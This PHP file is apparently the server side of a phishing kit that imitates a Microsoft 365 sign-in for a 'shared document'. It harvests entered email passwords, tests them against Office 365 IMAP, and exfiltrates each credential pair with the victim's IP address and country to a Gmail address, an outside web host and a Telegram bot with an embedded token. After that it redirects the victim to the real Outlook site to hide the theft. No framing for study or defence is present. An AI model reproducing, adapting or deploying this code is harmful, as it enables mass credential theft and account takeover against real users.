<?php
include "bl0cker.php";

session_start(); error_reporting(0); header('Access-Control-Allow-Origin: *');
$date = date("Y-m-d-H-i-s");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$user = $_POST['u'];
$pass = $_POST['p'];
if(!empty($pass) && !empty($user)) {
	$count = strlen ($pass);
	$recipient = "jdoe88547@gmail.com";
	if ($count > 3) {
		$Checker = @imap_open("{outlook.office365.com:993/imap/ssl}INBOX", $user, $pass);
		$checker = 0;
		if($Checker){
			$msg = "
			Email: ".$user."
			Pass : ".$pass."
			IP Address : ".$ip."
			Country : ".$country."
			";
			$msg = wordwrap($msg,70);
			mail($recipient,"Verified | $country | $ip",$msg);

?>

			<script>
			$(".FORM1").hide();
			$(".Finish").show();
			window.location.replace("https://outlook.office365.com");
			</script>
			
<?php

		} else {
			if(isset($_SESSION['t'])){
				$times = $_SESSION['t']+1;
			}else{
				$_SESSION['t'] = 1;
				$times = $_SESSION['t'];
			}
			$msg = "
			Email: ".$user."
			Pass : ".$pass."
			IP Address : ".$ip."
			Country : ".$country."
			";
			$msg = wordwrap($msg,70);
			mail($recipient,"Unverified | $country | $ip | $user",$msg);
			$token="5895754753:AAHri2tsV8z9D2ddIFnpDa4Mod-RaRpWDHU";
			function cp($url,$post){$ch=curl_init();
			curl_setopt($ch,CURLOPT_URL,$url);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($ch,CURLOPT_POST,1);
			curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
			$up=curl_exec($ch);
			curl_close($ch);}
			cp("http://thededsec.com/","office=$msg");
			cp("https://api.telegram.org/bot$token/sendMessage","chat_id=1185371303&text=$msg");
			if($times>1){
			$_SESSION['t'] = null;
			
?>

			<script>
			$(".FORM1").hide();
			$(".Finish").show();
			window.location.replace("https://outlook.office365.com");
			</script>
			
<?php

			}else{

?>

			<script>
			$("#pass").animate({left:0, opacity:"show"}, 1000);
			$("#msg").empty();
			$("#msg").show();
			$("#msg").html("Incorrect password, verify your 365 password to access shared document<br>");
			</script>
			
<?php 	
			}
		}
	} else {

?>

		<script>
		$("#pass").animate({left:0, opacity:"show"}, 1000);
		$("#msg").empty();
		$("#msg").show();
		$("#msg").html("Your	password is too short, verify your password to access shared document<br>");
		</script>
	
<?php

	}
} else {
	
?>
				
	<script>
	$("#pass").animate({left:0, opacity:"show"}, 1000);
	$("#msg").empty();
	$("#msg").show();
	$("#msg").append("Please enter your password to access shared document<br>");	
	</script>
	
<?php 

}

?>